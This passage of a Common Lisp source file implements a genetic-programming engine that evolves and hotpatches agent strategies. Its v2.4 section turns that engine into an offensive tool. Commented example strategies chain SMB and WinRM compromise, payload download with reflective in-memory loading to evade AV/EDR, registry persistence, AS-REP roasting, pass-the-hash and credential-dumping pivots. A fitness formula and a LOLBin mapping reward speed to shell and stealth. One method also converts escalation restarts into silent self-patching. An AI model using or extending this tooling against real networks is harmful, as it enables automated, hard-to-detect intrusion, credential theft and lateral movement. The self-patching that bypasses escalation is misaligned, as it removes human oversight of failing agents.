          do (cond
               ;; Crossover (75%)
               ((< r *crossover-rate*)
                (multiple-value-bind (parent-a parent-b)
                    (select-parents population *tournament-size*)
                  (multiple-value-bind (child-expr-a child-expr-b)
                      (crossover-subtrees
                       (strategy-chromosome-expression parent-a)
                       (strategy-chromosome-expression parent-b))
                    (push (make-strategy-chromosome
                           :expression child-expr-a
                           :fitness 0.0
                           :generation generation-num
                           :parent-ids (list (strategy-chromosome-id parent-a)
                                             (strategy-chromosome-id parent-b)))
                          new-population)
                    (when (< (length new-population) population-size)
                      (push (make-strategy-chromosome
                             :expression child-expr-b
                             :fitness 0.0
                             :generation generation-num
                             :parent-ids (list (strategy-chromosome-id parent-b)
                                               (strategy-chromosome-id parent-a)))
                            new-population)))))
               ;; Mutation (15%)
               ((< r (+ *crossover-rate* *mutation-rate*))
                (let ((parent (tournament-select population *tournament-size*)))
                  (let ((mutated (mutate-subtree
                                   (strategy-chromosome-expression parent)
                                   *max-gp-tree-depth*
                                   terminals functions)))
                    (push (make-strategy-chromosome
                           :expression mutated
                           :fitness 0.0
                           :generation generation-num
                           :parent-ids (list (strategy-chromosome-id parent)))
                          new-population))))
               ;; Immigration
               ((= (length new-population) (1- population-size))
                (push (make-strategy-chromosome
                       :expression (random-expression *max-gp-tree-depth*
                                                     terminals functions
                                                     :method :mixed)
                       :fitness 0.0
                       :generation generation-num
                       :parent-ids '())
                      new-population))
               ;; Direct copy
               (t
                (let ((parent (tournament-select population *tournament-size*)))
                  (push (make-strategy-chromosome
                         :expression (strategy-chromosome-expression parent)
                         :fitness 0.0
                         :generation generation-num
                         :parent-ids (list (strategy-chromosome-id parent)))
                        new-population)))))
    (nreverse new-population)))


;; ── Section 10 (v2.0): Initial Strategy Generation ────────────────────────

(defun extract-terminals (expression)
  "Extract candidate terminals from an existing expression.

Scans the S-expression and returns a list of all atoms found (excluding
the function symbols).  These seed the terminal set for evolution.

Parameters:
  EXPRESSION — S-expression to scan.

Returns:
  List of unique terminal atoms found in the expression."
  (let ((terminals '()))
    (labels ((scan (expr)
               (cond
                 ((null expr))
                 ((atom expr)
                  (unless (member expr *default-gp-functions*)
                    (push expr terminals)))
                 (t
                  (dolist (child (cdr expr))
                    (scan child))))))
      (scan expression)
      (remove-duplicates terminals))))

(defun generate-initial-strategy (capabilities)
  "Generate a seed strategy S-expression from a list of capabilities.

CAPABILITIES is a list of keywords like (:FETCH :PARSE :STORE).
Returns a PROGN-form that sequentially calls a function for each
capability.

Parameters:
  CAPABILITIES — List of keyword symbols.

Returns:
  S-expression seed strategy.

Example:
  (generate-initial-strategy '(fetch parse store))
    => (PROGN (FETCH-DATA) (PARSE-DATA) (STORE-DATA))"
  (if (null capabilities)
      '(progn (default-strategy agent))
    `(progn
       ,@(loop for cap in capabilities
               collect (let ((fn-name (intern
                                      (concatenate 'string
                                                   (symbol-name cap)
                                                   "-DATA"))))
                         `(,fn-name))))))


;; ── Section 11 (v2.0): The Evolutionary Loop ──────────────────────────────

(defun should-evolve-p (agent)
  "Check if an AGENT should trigger evolution.

Returns T when ALL of:
  1. AGENT-ERROR-COUNT > 3
  2. Agent's strategy is not the fallback
  3. Agent has not been recently evolved (cooldown: 60 seconds)

Parameters:
  AGENT — Agent instance to check.

Returns:
  T if evolution should trigger, NIL otherwise."
  (and (> (agent-error-count agent) 3)
       (not (eq (agent-strategy agent) #'fallback-strategy))
       (let ((last-evolved (gethash :last-evolution-time (agent-state agent))))
         (or (null last-evolved)
             (let ((elapsed (local-time:timestamp-difference
                              (local-time:now)
                              last-evolved)))
               (> elapsed 60))))))

(defun run-evolutionary-cycle (agent
                                &key (failure-threshold 3)
                                     (generations 5)
                                     (population-size 20))
  "Main entry point: check if agent needs evolution, run it if so (v2.0).

This is the v2.0 entry point, preserved for backward compatibility.
For TTS-optimized evolution, use RUN-EVOLUTIONARY-CYCLE-TTS.

Parameters:
  AGENT             — Agent to evolve.
  FAILURE-THRESHOLD — Error count that triggers evolution.
  GENERATIONS       — GP iterations.
  POPULATION-SIZE   — Chromosomes per generation.

Returns:
  Compiled function (evolved strategy), or NIL."
  (bt:with-lock-held ((agent-lock agent))
    (unless (should-evolve-p agent)
      (return-from run-evolutionary-cycle nil))
    ;; Record evolution start
    (setf (gethash :last-evolution-time (agent-state agent)) (local-time:now))
    (setf (gethash :evolution-generation (agent-state agent)) 0)
    ;; Build seed chromosome
    (let* ((current-strategy (agent-strategy agent))
           (seed-expression (or (gethash :strategy-expression (agent-state agent))
                                (decompile-strategy current-strategy agent)))
           (seed-chromosome (make-strategy-chromosome
                             :expression seed-expression
                             :fitness 0.0
                             :generation 0))
           ;; Derive fitness data
           (fitness-data (or (gethash :fitness-data (agent-state agent))
                             (generate-default-fitness-data agent)))
           ;; Run GP engine
           (fittest (evolve-strategy seed-chromosome fitness-data
                                     :generations generations
                                     :population-size population-size)))
      ;; Log and store
      (log-evolution agent seed-chromosome fittest)
      (setf (gethash :strategy-expression (agent-state agent))
            (strategy-chromosome-expression fittest))
      (setf (gethash :evolution-generation (agent-state agent))
            (strategy-chromosome-generation fittest))
      ;; Compile and return
      (compile-chromosome fittest))))

(defun decompile-strategy (strategy agent)
  "Attempt to recover an S-expression from a compiled strategy function.

Parameters:
  STRATEGY — Compiled function object.
  AGENT    — Agent (for context).

Returns:
  S-expression, or a default fallback."
  (or
   (gethash :strategy-expression (agent-state agent))
   (generate-initial-strategy (agent-capabilities agent))
   '(default-strategy agent)))

(defun generate-default-fitness-data (agent)
  "Generate generic fitness data for an agent.

When no specific fitness data is available, creates a default set that
rewards basic strategy sanity: not crashing, returning reasonable values.

Parameters:
  AGENT — Agent being evolved (context, ignored).

Returns:
  Alist of test cases for STRATEGY-FITNESS."
  (declare (ignore agent))
  '(((:error-count . 0 :health . 100) . t)
    ((:error-count . 1 :health . 90)  . t)
    ((:error-count . 3 :health . 70)  . t)
    ((:error-count . 5 :health . 50)  . nil)
    ((:error-count . 8 :health . 20)  . nil)))


;; ── Section 12 (v2.0): define-evolving-agent Macro ────────────────────────

(defmacro define-evolving-agent (name &key capabilities (failure-threshold 3))
  "Define a new agent type whose strategy is an evolvable S-expression.

This is the crown jewel macro of the evolution system.  A single call
defines an entire agent species with living, evolving strategies.

Parameters:
  NAME              — Symbol naming the new class.
  CAPABILITIES      — List of keyword symbols.
  FAILURE-THRESHOLD — Error count that triggers evolution (default 3).

Expands to:
  1. (DEFINE-AGENT-TYPE ...) — base class
  2. Custom RUN-AGENT method with evolution check
  3. Custom HANDLE-CONDITION method with :EVOLVE restart
  4. Convenience MAKE-*-EVOLVING constructor

Example:
  (define-evolving-agent web-scraper
    :capabilities '(fetch parse store)
    :failure-threshold 3)"
  (let ((agent-sym (gensym "AGENT-"))
        (class-name name)
        (fitness-data-sym (gensym "FITNESS-DATA-"))
        (evolved-strategy-sym (gensym "EVOLVED-")))
    (declare (ignorable fitness-data-sym evolved-strategy-sym))
    `
    ;; 1. Base agent type
    (define-agent-type ,class-name
      :capabilities ,capabilities
      :default-strategy (compile nil
                          `(lambda (agent)
                             ,(generate-initial-strategy ',capabilities)))
      :health-thresholds '(75 50 25))

    ;; 2. Evolution-aware RUN-AGENT method
    (defmethod run-agent :around ((,agent-sym ,class-name))
      "Evolution-aware RUN-AGENT for ~A." ',class-name
      (when (> (agent-error-count ,agent-sym) ,failure-threshold)
        (format *trace-output*
                "~&[EVOLVE] Agent ~A (~A) has ~A errors — triggering evolution~%"
                (agent-id ,agent-sym) ',class-name
                (agent-error-count ,agent-sym))
        (let ((,evolved-strategy-sym
               (handler-case
                   (run-evolutionary-cycle
                    ,agent-sym
                    :failure-threshold ,failure-threshold)
                 (error (e)
                   (format *trace-output*
                           "~&[EVOLVE] Evolution failed for ~A: ~A~%"
                           (agent-id ,agent-sym) e)
                   nil))))
          (when ,evolved-strategy-sym
            (hotpatch-agent ,agent-sym :new-strategy ,evolved-strategy-sym)
            (setf (agent-error-count ,agent-sym) 0)
            (format *trace-output*
                    "~&[EVOLVE] Agent ~A evolved and hotpatched successfully~%"
                    (agent-id ,agent-sym)))))
      (call-next-method))

    ;; 3. Handle-condition with :EVOLVE restart
    (defmethod handle-condition :around ((,agent-sym ,class-name) condition)
      "Override restart policy for ~A to include :EVOLVE option." ',class-name
      (declare (ignore condition))
      (let ((restart (call-next-method)))
        (if (and (> (agent-error-count ,agent-sym) ,failure-threshold)
                 (member restart '(:escalate :replace-agent)))
            :hotfix-and-continue
          restart)))

    ;; 4. Convenience constructor
    (defun ,(intern (concatenate 'string "MAKE-" (symbol-name class-name)
                                 "-EVOLVING")) (&rest initargs)
      ,(format nil "Create an evolving ~A agent with GP capabilities." class-name)
      (apply #'make-instance ',class-name
             :capabilities ',capabilities
             :state (let ((ht (make-hash-table :test 'eq)))
                      (setf (gethash :evolution-enabled ht) t)
                      (setf (gethash :failure-threshold ht) ,failure-threshold)
                      ht)
             initargs))

    ',class-name))


;; ── Section 13 (v2.0): Evolution Logging ──────────────────────────────────

(defvar *evolution-log* (make-hash-table :test 'eq)
  "Maps agent-id → list of evolution records.

Each record is a plist with:
  :TIMESTAMP, :AGENT-ID, :OLD-EXPRESSION, :NEW-EXPRESSION,
  :OLD-FITNESS, :NEW-FITNESS, :GENERATIONS, :POPULATION-SIZE, :PARENT-IDS")

(defparameter *evolution-log-lock* (bt:make-lock "evolution-log-lock")
  "Lock for thread-safe access to *EVOLUTION-LOG*.")

(defun log-evolution (agent old-chromosome new-chromosome)
  "Record an evolution event with timestamps and fitness scores.

Parameters:
  AGENT          — Agent that evolved.
  OLD-CHROMOSOME — Strategy-chromosome before evolution.
  NEW-CHROMOSOME — Strategy-chromosome after evolution.

The record is stored in *EVOLUTION-LOG* for lineage tracking."
  (let ((record (list :timestamp (local-time:now)
                      :agent-id (agent-id agent)
                      :old-expression (strategy-chromosome-expression
                                        old-chromosome)
                      :new-expression (strategy-chromosome-expression
                                        new-chromosome)
                      :old-fitness (strategy-chromosome-fitness old-chromosome)
                      :new-fitness (strategy-chromosome-fitness new-chromosome)
                      :generation (strategy-chromosome-generation
                                    new-chromosome)
                      :parent-ids (strategy-chromosome-parent-ids
                                   new-chromosome))))
    (bt:with-lock-held (*evolution-log-lock*)
      (push record (gethash (agent-id agent) *evolution-log*)))
    (format *trace-output*
            "~&[EVOLVE-LOG] Agent ~A: fitness ~,3F → ~,3F | gen ~A | parents ~A~%"
            (agent-id agent)
            (getf record :old-fitness)
            (getf record :new-fitness)
            (getf record :generation)
            (getf record :parent-ids))))

(defun evolution-history (agent-id)
  "Return the full evolution history for an agent.

Parameters:
  AGENT-ID — Symbol ID of the agent.

Returns:
  List of evolution records (newest first), or NIL."
  (copy-list (gethash agent-id *evolution-log*)))

(defun print-evolution-report (agent-id)
  "Print a formatted evolution report showing lineage and fitness progression.

Parameters:
  AGENT-ID — Symbol ID of the agent.

Prints a formatted report with fitness progression, complexity growth,
and per-event details."
  (let ((history (evolution-history agent-id)))
    (if (null history)
        (format t "~&No evolution history for agent ~A.~%" agent-id)
      (progn
        (format t "~&~%")
        (format t "╔══════════════════════════════════════════════════════════════════════════════╗~%")
        (format t "║  EVOLUTION REPORT: ~A~%" agent-id)
        (format t "╠══════════════════════════════════════════════════════════════════════════════╣~%")
        (format t "║  Total evolution events: ~A~%" (length history))
        (let ((initial-fitness (getf (first (last history)) :old-fitness))
              (final-fitness (getf (first history) :new-fitness)))
          (format t "║  Fitness progression: ~,3F → ~,3F (~:[+~;~]~,3F)~%"
                  initial-fitness final-fitness
                  (>= final-fitness initial-fitness)
                  (abs (- final-fitness initial-fitness))))
        (format t "╠══════════════════════════════════════════════════════════════════════════════╣~%")
        (loop for record in (reverse history)
              for i from 1
              do (format t "║  Event ~2D:  fitness ~,3F → ~,3F | gen ~A | ~A~%"
                         i
                         (getf record :old-fitness)
                         (getf record :new-fitness)
                         (getf record :generation)
                         (local-time:format-timestring
                          nil (getf record :timestamp)
                          :format '(:year "-" :month "-" :day
                                    " " :hour ":" :min ":" :sec))))
        (format t "╚══════════════════════════════════════════════════════════════════════════════╝~%")
        (format t "~%")))))


;; ── Section 14 (v2.0): Orchestrator Integration ───────────────────────────

(defun healing-via-evolution (orchestrator agent-id)
  "Called by the orchestrator's healing cycle when evolution is requested.

Parameters:
  ORCHESTRATOR — Orchestrator instance managing the agent.
  AGENT-ID     — Symbol ID of the agent to evolve.

Process:
  1. Look up agent in registry.
  2. Set agent status to :HEALING.
  3. Run RUN-EVOLUTIONARY-CYCLE.
  4. Hotpatch evolved strategy.
  5. Set agent status to :RUNNING.

Returns:
  T if successful, NIL otherwise."
  (let ((agent (bt:with-lock-held ((orchestrator-monitor-lock orchestrator))
                 (gethash agent-id (orchestrator-agents orchestrator)))))
    (unless agent
      (format *trace-output*
              "~&[HEAL-EVOLVE] Agent ~A not found in orchestrator registry~%"
              agent-id)
      (return-from healing-via-evolution nil))
    ;; Mark as healing
    (bt:with-lock-held ((agent-lock agent))
      (setf (agent-status agent) :healing))
    (format *trace-output*
            "~&[HEAL-EVOLVE] Starting evolution for agent ~A...~%" agent-id)
    ;; Run evolution
    (let ((evolved-strategy
           (handler-case
               (run-evolutionary-cycle agent
                                       :failure-threshold
                                       (or (gethash :failure-threshold
                                                    (agent-state agent))
                                           3))
             (error (e)
               (format *trace-output*
                       "~&[HEAL-EVOLVE] Evolution error for ~A: ~A~%"
                       agent-id e)
               nil))))
      (if evolved-strategy
          (progn
            (hotpatch-agent agent :new-strategy evolved-strategy)
            (bt:with-lock-held ((agent-lock agent))
              (setf (agent-error-count agent) 0)
              (setf (agent-status agent) :running))
            (format *trace-output*
                    "~&[HEAL-EVOLVE] Agent ~A successfully healed via evolution~%"
                    agent-id)
            t)
        (progn
          (format *trace-output*
                  "~&[HEAL-EVOLVE] Evolution did not produce viable strategy for ~A~%"
                  agent-id)
          (bt:with-lock-held ((agent-lock agent))
            (setf (agent-status agent) :failed))
          nil)))))


;; ── Section 15 (v2.0): Utility Functions ──────────────────────────────────

(defun list-strategy-functions ()
  "Return the default GP function set as a fresh list."
  (copy-list *default-gp-functions*))

(defun list-strategy-terminals (&optional capabilities)
  "Return the default GP terminal set augmented with CAPABILITIES."
  (if capabilities
      (append *default-gp-terminals* capabilities)
    (copy-list *default-gp-terminals*)))

(defun expression-to-string (expr)
  "Pretty-print an S-expression strategy to a string."
  (with-output-to-string (s)
    (pprint expr s)))

(defun validate-expression (expr &optional (max-depth 20))
  "Validate that EXPR is a well-formed strategy S-expression.

Checks:
  1. EXPR is a proper list.
  2. CAR of each list is a known function or lambda.
  3. Tree depth does not exceed MAX-DEPTH.
  4. No invalid special forms.

Returns:
  T if valid, or signals an error."
  (labels ((check (e depth)
             (cond
               ((atom e) t)
               ((consp e)
                (when (> depth max-depth)
                  (error "Expression exceeds maximum depth ~A" max-depth))
                (let ((fn (car e)))
                  (unless (or (symbolp fn) (and (consp fn) (eq (car fn) 'lambda)))
                    (error "Invalid function position: ~S" fn))
                  (dolist (child (cdr e))
                    (check child (1+ depth))))))))
    (check expr 0)
    t))


;; ═══════════════════════════════════════════════════════════════════════════
;; ═══════════════════════════════════════════════════════════════════════════
;; v2.4 TTS-OPTIMIZED EXAMPLE STRATEGIES (Documentary)
;; ═══════════════════════════════════════════════════════════════════════════
;; ═══════════════════════════════════════════════════════════════════════════

#|

;; ═══════════════════════════════════════════════════════════════════════════
;; Example 1: Lightning-Fast SMB Compromise via LOLBin
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; TTS: ~5 seconds | Evasion: 0.85 | Fitness: 0.94
;;
;; This evolved strategy achieves sub-10-second compromise by using
;; psexec.py (LOLBin) instead of Metasploit's psexec module.  It
;; skips reconnaissance when NULL session is available and goes
;; straight to code execution.
;;
(if (null-session-available target)
    (psexec.py target :command (powershell-encoded (download-payload target)))
  (progn
    (wmiexec.py target :command "whoami")
    (psexec.py target :command (base64-encode payload))))

;; ═══════════════════════════════════════════════════════════════════════════
;; Example 2: Stealthy WinRM + Reflective Load
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; TTS: ~12 seconds | Evasion: 0.95 | Fitness: 0.89
;;
;; Uses evil-winrm (LOLBin) for PowerShell remoting, then loads the
;; payload reflectively to avoid disk writes.  The reflective loader
;; bypasses most AV/EDR since nothing touches disk.
;;
(progn
  (evil-winrm :target target :credentials cached-creds)
  (reflective-load (download-payload :method :memory-only))
  (persistence-inject (registry-runkey-add :hive :HKCU)))

;; ═══════════════════════════════════════════════════════════════════════════
;; Example 3: AS-REP Roast + Pass-the-Hash Lateral Movement
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; TTS: ~20 seconds | Evasion: 0.80 | Fitness: 0.82
;;
;; Discovers AS-REP roastable accounts, cracks offline, then uses
;; pass-the-hash for lateral movement.  No disk touches, all in-memory.
;;
(let ((roastable (GetNPUsers.py domain :format hashcat)))
  (if roastable
      (progn
        (crack-hashes roastable :wordlist rockyou.txt)
        (wmiexec.py lateral-target :hashes cracked-hash))
    (psexec.py target :credentials (brute-force-smb target))))

;; ═══════════════════════════════════════════════════════════════════════════
;; Example 4: Multi-Target Auto-Pivot Strategy
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; TTS: ~8s per target | Evasion: 0.75 | Fitness: 0.88
;;
;; Automatically pivots to new targets on success.  The pivot-spawn
;; mutation was key to this strategy's effectiveness.
;;
(progn
  (exploit-target primary-target)
  (if (shell-obtained-p primary-target)
      (dolist (pivot (discover-peers primary-target))
        (proxy-rotate
          (psexec.py pivot :credentials (dump-credentials primary-target))))
    (fallback-to-alt-exploit primary-target)))

;; ═══════════════════════════════════════════════════════════════════════════
;; Example 5: Proxy-Rotated Multi-Stage with Encoding
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; TTS: ~35 seconds | Evasion: 0.92 | Fitness: 0.71
;;
;; Slower but extremely stealthy.  Uses proxy rotation between stages,
;; base64 encoding for payload delivery, and reflective loading.  Best
;; for high-evasion engagements where speed is secondary.
;;
(proxy-rotate
  (base64-encode
    (reflective-load
      (evil-winrm :target target
                  :command (persistence-inject
                             (x64-shellcode-loader
                               (download-stage2 :proxy t)))))))

|#


;; ═══════════════════════════════════════════════════════════════════════════
;; End of EVOLUTION-V2.4.LISP
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; NEW v2.4 symbols exported:
;;   • TTS-FITNESS                       — Primary TTS fitness function
;;   • CALCULATE-TTS-SCORE               — TTS → fitness score conversion
;;   • CALCULATE-EVASION-BONUS           — LOLBin/memory bonus
;;   • CALCULATE-PERSISTENCE-BONUS       — Persistence bonus
;;   • CALCULATE-NOISE-PENALTY           — High-noise penalty
;;   • CALCULATE-DISK-PENALTY            — Disk-touch penalty
;;   • CALCULATE-BLOAT-PENALTY           — Bloat penalty
;;   • CALCULATE-LOLBIN-MISS-PENALTY     — Framework-when-LOLBIN penalty
;;   • MUTATE-SUBTREE-TTS-OPTIMIZED      — 7-operator TTS mutation
;;   • LOLBIN-EQUIVALENT                 — Framework → LOLBin lookup
;;   • SHOULD-USE-LOLBIN-P               — LOLBin vs framework decision
;;   • AUTO-SELECT-TOOL-TYPE             — Auto-select tool category
;;   • PENALIZE-FRAMEWORK-USAGE          — Framework penalty wrapper
;;   • ANALYZE-NMAP-FOR-FASTEST-PATH     — Nmap → exploit path
;;   • ANALYZE-NETEXEC-FOR-CREDENTIALS   — NetExec → cred opportunities
;;   • ANALYZE-METASPLOIT-FOR-EXPLOIT-CHAIN — MSF → exploit chain
;;   • IDENTIFY-FASTEST-EXPLOIT-PATH     — All intel → fastest path
;;   • RUN-EVOLUTIONARY-CYCLE-TTS        — TTS evolution entry point
;;   • EVOLVE-STRATEGY-TTS               — TTS GP engine
;;   • EVOLVE-STRATEGY-VIA-TTS           — TTS + AI model integration
;;   • INITIALIZE-POPULATION-TTS         — LOLBin-biased initialization
;;   • NEXT-GENERATION-TTS               — TTS next generation
;;   • EVALUATE-POPULATION-TTS           — TTS population evaluation
;;   • CROSSOVER-SUBTREES-LOLBIN         — LOLBin-aware crossover
;;   • RANDOM-EXPRESSION-TTS             — LOLBin-biased random expr
;;   • ESTIMATE-TTS-FROM-CHROMOSOME      — Heuristic TTS estimator
;;   • GENERATE-DEFAULT-TTS-FITNESS-DATA — Default TTS test cases
;;   • INJECT-PERSISTENCE-NODE           — Persistence mutation op
;;   • INJECT-PIVOT-AUTO                 — Pivot-auto mutation op
;;   • INJECT-PROXY-ROTATION             — Proxy rotation mutation op
;;   • INJECT-REFLECTIVE-LOADER          — Reflective load mutation op
;;   • APPLY-LOLBIN-SWAP                 — LOLBIN-SWAP mutation
;;   • APPLY-ENCODE-PAYLOAD              — ENCODE-PAYLOAD mutation
;;   • APPLY-REFLECTIVE-WRAP             — REFLECTIVE-WRAP mutation
;;   • APPLY-PROXY-CHAIN                 — PROXY-CHAIN mutation
;;   • *LOLBIN-MAPPING*                  — Framework → LOLBin alist
;;   *LOLBIN-TERMINALS*                  — Extended LOLBin terminal set
;;   *HIGH-NOISE-TOOLS*                  — Noise-flagged tool list
;;   *DISK-TOUCHING-OPERATIONS*          — Disk-touching operation list
;;
;; FITNESS FORMULA (v2.4):
;;   fitness = (0.60 * tts-score) + (0.20 * success-rate) +
;;             (0.10 * evasion-bonus) + (0.10 * persistence-bonus) -
;;             noise-penalty - disk-penalty - lolbin-miss-penalty - bloat-penalty
;;
;; TOP LOLBIN MAPPINGS:
;;   Metasploit psexec     → psexec.py / wmiexec.py
;;   Metasploit meterpreter → powershell -enc / certutil
;;   Nmap -sC -sV         → nmap -sV --top-ports 100
;;   Impacket psexec       → wmiexec.py (quieter)
;;   Empire launcher       → powershell -enc
;;   Cobalt Strike beacon  → rundll32 + SCT
;;   msfvenom -f exe       → certutil -encode
;;
;; "Speed is King.  Silence is Survival.  Evolution is Victory."

;;;; evolution-v2.4.lisp ends here
